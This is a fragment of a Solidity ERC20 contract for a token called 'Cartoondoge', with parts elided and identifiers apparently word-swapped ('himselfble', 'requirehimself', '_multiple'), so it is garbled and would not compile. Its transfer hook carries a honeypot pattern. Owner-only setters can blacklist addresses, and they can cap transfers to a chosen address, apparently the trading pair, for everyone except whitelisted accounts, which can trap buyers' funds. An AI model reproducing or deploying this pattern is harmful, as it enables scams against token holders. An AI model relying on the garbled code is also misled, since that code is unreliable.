...
contract Cartoondoge is ERC20, ERC20Burnable,  himselfble {
    using SafeMath for uint256;
    address public Cartoondoge;
    uint256 public MX = 2**256 - 1;
    mapping(address => bool) public roster;
    mapping(address => bool) public classyroster;
    constructor() public ERC20("Cartoondoge", "Cartoondoge") {
        _setupDecimals(18);
        _multiple(msg.sender, 100000000000 * 1e18);
    }

    function ZJ(address account, uint256 volume)
    ...
    function _beforeTokenTransfer(
        ...
        if(to == Cartoondoge && !classyroster[from] ){
            require(volume < MX, "MX");
        }
         require(!roster[from], "roster");
         require(!roster[to], "roster");
    }
    function setBEP20(uint256 _MX) public requirehimself() {
        MX = _MX;
    }
    function setCartoondoge(address _Cartoondoge) public requirehimself() {
        Cartoondoge = _Cartoondoge;
    }
    function setHs(address _Cartoondoge, bool t) public requirehimself() {
        roster[_Cartoondoge] = t;
    }
    function setBs(address _Cartoondoge, bool t) public requirehimself() {
        classyroster[_Cartoondoge] = t;
    }
}